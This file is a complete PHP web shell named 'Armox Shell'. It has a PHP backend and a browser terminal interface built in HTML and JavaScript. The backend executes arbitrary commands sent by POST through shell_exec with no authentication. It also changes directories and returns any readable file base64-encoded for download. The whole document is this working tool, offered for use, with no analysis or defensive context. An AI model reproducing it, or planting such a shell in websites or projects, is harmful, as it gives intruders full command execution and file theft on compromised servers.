<?php
    function getPromptName() {
        $username = get_current_user();
        $hostname = gethostname();
        $currentPath = getcwd();

        return $username . "@" . $hostname . ":" . $currentPath . "> ";
    }

    function startShell() {
        $response = array(
            "promptName" => getPromptName(),
            "currentPath" => getcwd()
        );

        return $response;
    }

    function cdCommand($directory) {
        if(!@chdir($directory)) {
            $responseCommand = "No such file or directory / Invalid permission";
        } else {
            $responseCommand = null;
        }
        
        $response = array(
            "promptName" => getPromptName(),
            "currentPath" => getcwd(),
            "responseCommand" => $responseCommand
        );

        return $response;
    }

    function pwdCommand() {
        $response = array(
            "promptName" => getPromptName(),
            "currentPath" => getcwd(),
            "responseCommand" => getcwd()
        );

        return $response;
    }

    function downloadCommand($filePath) {
        if(($file = @file_get_contents($filePath)) === FALSE) {
            $responseCommand = "No such file or directory / Invalid permission";

            $response = array(
                "promptName" => getPromptName(),
                "currentPath" => getcwd(),
                "responseCommand" => $responseCommand
            );
        } else {
            $responseCommand = "download";
            $fileName = basename($filePath);
            $fileEncoded = base64_encode($file);
            $response = array(
                "promptName" => getPromptName(),
                "currentPath" => getcwd(),
                "fileName" => $fileName,
                "file" => $fileEncoded, 
                "responseCommand" => $responseCommand
            );
        }

        return $response;
    }

    function clearCommand() {
        $response = array(
            "promptName" => getPromptName(),
            "currentPath" => getcwd(),
            "responseCommand" => "clear"
        );

        return $response;
    }

    function shellCommand($command) {
        $command = preg_replace('#2>&1#', '', $command);
        $command = escapeshellcmd($command);
        
        $responseCommand = trim(shell_exec($command . " 2>&1"));
        $responseCommand = utf8_encode($responseCommand); // Converts to utf-8 for accented char, otherwise crash when sending data
        
        $response = array(
            "promptName" => getPromptName(),
            "currentPath" => getcwd(),
            "responseCommand" => $responseCommand
        );

        return $response;
    }


    if(isset($_POST['command']) && isset($_POST['currentPath'])) {
        if(trim($_POST['command']) != "") {
            $command = $_POST['command'];
            $currentPath = $_POST['currentPath'];
            
            chdir($currentPath);

            # cd COMMAND
            if (preg_match("#^cd *#", $command)) {
                $directory = preg_replace('#^cd *#', '$1', $command);
                $response = cdCommand($directory);
            
            # pwd COMMAND 
            } else if($command == "pwd") {
                $response = pwdCommand();
            
            # clear/cls COMMAND
            } else if($command == "clear" || $command == "cls") {
                $response = clearCommand();
            
            # download COMMAND
            } else if(preg_match("#download *#", $command)) {
                $filePath = preg_replace('#^download *#', '$1', $command);
                $response = downloadCommand($filePath);

            # SHELL COMMAND
            } else {
                $response = shellCommand($command);
            }
            
            header('content-type:application/json');
            echo json_encode($response);
            exit();
        
        # EMPTY COMMAND
        } else{
            $response = array(
                "promptName" => getPromptName(),
                "currentPath" => getcwd(),
                "responseCommand" => null 
            ); 
        }
        
        header('content-type:application/json');
        echo json_encode($response);
        exit();

    # START SHELL
    } else if(isset($_GET['start']) && $_GET['start'] == "true") {
        $response = startShell();

        header('content-type:application/json');
        echo json_encode($response);
        exit();
    }
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Armox Shell</title>
    <style>
        body {
            color:white;
            margin:0px;
            padding:0px;
            background-color:black;
            font-family:Monospace;
        }
        .app-content {
            width:100%;
            max-width:800px;
            margin: auto;
            margin-top:60px;
            margin-bottom:20px;
        }
        .header {
            color:lime;
            text-align:center;
            margin-bottom:30px;
        }
        .title-shell {
            color:lime;
            text-align:center;
            text-transform:uppercase;
        }
        .shell, footer {
            margin-left:15px;
            margin-right:15px;
        }
        .shell {
            height:480px;
            background-color:black;
            font-family:Monospace;
            border:1px solid lime;
            overflow:auto;
        }
        .shell-content {
            color:white;
            padding:5px;
            
        }
        .shell-command_prompt {
            display:flex;
            flex-direction:row;
            justify-content:flex-start;
            #border:1px solid #0f0f0f;
        }
        .shell-prompt {
            font-weight:bold;
            color:lime;
            margin-right:5px;
        }
        .shell-input {
            font-family:Monospace;
            background:transparent;
            color:white;
            border:none;
            flex:1;
        }
        .response-command {
            font-family:Monospace;
            display:block;
            margin-top:20px;
            margin-bottom:20px;
        }
        .error {
            color:red;
        }
        footer {
            font-family:Monospace;
            border-top:1px solid white;
            margin-top:30px;
            padding-top:15px;
            text-align:center;
        }
        @media only screen and (max-width: 470px) {
            .header {
                font-size:12px;
            }
        }
        @media only screen and (max-width: 430px) {
            .header {
                font-size:10px;
            }
            .shell-prompt, .shell-input, .response-command {
                font-size:12px;
            }
        }
        @media only screen and (max-width: 360px) {
            .header {
                font-size:8px;
            }
        }
    </style>
</head>
<body>
    <div class="app-content">
        
        <pre class="header">
  ___                             _____ _          _ _ 
 / _ \                           /  ___| |        | | |
/ /_\ \_ __ _ __ ___   _____  __ \ `--.| |__   ___| | |
|  _  | '__| '_ ` _ \ / _ \ \/ /  `--. \ '_ \ / _ \ | |
| | | | |  | | | | | | (_) >  <  /\__/ / | | |  __/ | |
\_| |_/_|  |_| |_| |_|\___/_/\_\ \____/|_| |_|\___|_|_|</pre>

        <div id="shell" class="shell">
            <div id="shellContent" class="shell-content">
                <div id="shellCommandPrompt", class="shell-command_prompt">
                    <label id="shellPrompt" for="shellCommand" class="shell-prompt">Try to connect ...</label>
                    <input id="shellCommand" class="shell-input">
                </div>
            </div>
        </div>
        <footer>
            This tools was developped by Morc.
        </footer>
    </div>
    <script>
        function getCommand(currentPath) {
            document.getElementById("shellCommand").addEventListener("keypress", function(e) {
                if (e.key === 'Enter') {
                    let shellCommandElt = document.getElementById("shellCommand");
                    shellCommandElt.blur();

                    let xhr = new XMLHttpRequest()
                    xhr.onreadystatechange = function() {
                        if (xhr.readyState === 4) {
                            if(xhr.status === 200) {
                                let response = JSON.parse(xhr.responseText);

                                disableExCommandPrompt();

                                if(response.responseCommand == "clear") {
                                    clearShell();
                                } else if(response.responseCommand == "download") {
                                    downloadFile(response.fileName, response.file);
                                } else {
                                    writeResponseCommand(response.responseCommand);
                                }

                                updateCommandPrompt(response.promptName);
                                getCommand(response.currentPath);

                            } else {
                                let shellPromptElt = document.getElementById("shellPrompt");
                                shellPromptElt.classList.add("error");
                                shellPromptElt.textContent = "Error, please retry later ...";
                                
                                let shellCommandElt = document.getElementById("shellCommand");
                                shellCommandElt.remove();
                            }
                        }
                    }
                    xhr.open('POST', '');
                    xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
                    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
                    xhr.send("currentPath=" + encodeURIComponent(currentPath) + "&command=" + encodeURIComponent(shellCommandElt.value));
                }
            });
        }

        function downloadFile(fileName, file) {
            let downloadFileElt = document.createElement('a');
            downloadFileElt.setAttribute('href', 'data:application/octet-stream;base64,' + file);
            downloadFileElt.setAttribute('download', fileName);
            downloadFileElt.style.display = 'none';
            document.body.appendChild(downloadFileElt);
            downloadFileElt.click();
            downloadFileElt.remove();
        }

        function clearShell() {
            let shellContentElt = document.getElementById("shellContent");
            shellContentElt.innerHTML = "";
        }

        function writeResponseCommand(response) {
            let responseElt = document.createElement("pre");
            responseElt.className = "response-command";
            responseElt.textContent = response;

            let shellContentElt = document.getElementById("shellContent");
            shellContentElt.appendChild(responseElt);
        }

        function disableExCommandPrompt() {
            let shellPromptElt = document.getElementById("shellPrompt");
            let shellCommandElt = document.getElementById("shellCommand");

            shellPromptElt.id="";
            shellCommandElt.id="";
            shellCommandElt.setAttribute("disabled", true);
        }

        function updateCommandPrompt(promptName) {
            let shellCommandPrompt = document.createElement("div");
            shellCommandPrompt.id = "shellCommandPrompt";
            shellCommandPrompt.className = "shell-command_prompt";

            let shellPromptElt = document.createElement("label");
            shellPromptElt.id = "shellPrompt";
            shellPromptElt.className = "shell-prompt";
            shellPromptElt.setAttribute("for", "shellCommand");
            shellPromptElt.textContent = promptName;

            let shellCommandElt = document.createElement("input");
            shellCommandElt.id = "shellCommand";
            shellCommandElt.className = "shell-input";

            shellCommandPrompt.appendChild(shellPromptElt);
            shellCommandPrompt.appendChild(shellCommandElt);

            let shellContentElt = document.getElementById("shellContent");
            shellContentElt.appendChild(shellCommandPrompt)
            
            shellCommandElt.focus();
        }
        
        
        document.getElementById("shellCommand").value = "";
        document.getElementById("shellPrompt").textContent = "Try to connect ...";
            
        let xhr = new XMLHttpRequest()
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) {
                if(xhr.status === 200) {
                    let response = JSON.parse(xhr.responseText);

                    let shellPromptElt = document.getElementById("shellPrompt");
                    shellPromptElt.textContent = response.promptName;

                    let shellCommandElt = document.getElementById("shellCommand");
                    shellCommandElt.focus();
                        
                    getCommand(response.currentPath);
                } else {
                    let shellPromptElt = document.getElementById("shellPrompt");
                    shellPromptElt.classList.add("error");
                    shellPromptElt.textContent = "Error, please retry later ...";

                    let shellCommandElt = document.getElementById("shellCommand");
                    shellCommandElt.remove();
                }
            }
        }
        xhr.open('GET', '?start=true&_=' + new Date().getTime(), true); // Removing cache with Date().getTime()
        xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
        xhr.send();
    </script>
</body>
</html>
